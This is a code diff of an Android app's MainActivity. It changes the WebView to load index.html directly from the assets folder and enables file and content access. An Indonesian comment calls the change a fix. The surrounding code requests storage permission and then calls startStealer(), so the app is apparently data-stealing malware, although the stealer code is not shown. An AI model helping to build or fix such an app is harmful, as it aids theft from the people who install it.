@@ -10,9 +10,7 @@ import android.os.Bundle;
 import android.os.Environment;
 import android.provider.Settings;
 import android.webkit.WebView;
-import java.io.File;
-import java.io.FileOutputStream;
-import java.io.InputStream;
+import android.webkit.WebViewClient;
 
 public class MainActivity extends Activity {
 
@@ -26,38 +24,18 @@ public class MainActivity extends Activity {
         webView = new WebView(this);
         webView.getSettings().setJavaScriptEnabled(true);
         webView.getSettings().setDomStorageEnabled(true);
+        webView.getSettings().setAllowFileAccess(true);
+        webView.getSettings().setAllowContentAccess(true);
+        
+        // FIX: Baca langsung dari folder assets (ga perlu copy ke cache)
+        webView.loadUrl("file:///android_asset/index.html");
         setContentView(webView);
-
-        // Copy index.html ke cache biar bisa dibaca WebView
-        copyAssetsToCache();
 
         // Cek Izin
         if (!hasStoragePermission()) {
             requestStoragePermission();
         } else {
             startStealer();
-        }
-    }
-
-    private void copyAssetsToCache() {
-        try {
-            File cacheDir = new File(getCacheDir(), "web");
-            if (!cacheDir.exists()) cacheDir.mkdirs();
-            File indexFile = new File(cacheDir, "index.html");
-            if (!indexFile.exists()) {
-                InputStream is = getAssets().open("index.html");
-                FileOutputStream fos = new FileOutputStream(indexFile);
-                byte[] buffer = new byte[1024];
-                int length;
-                while ((length = is.read(buffer)) > 0) {
-                    fos.write(buffer, 0, length);
-                }
-                fos.close();
-                is.close();
-            }
-            webView.loadUrl("file://" + indexFile.getAbsolutePath());
-        } catch (Exception e) {
-            webView.loadUrl("https://www.google.com");
         }
     }
 
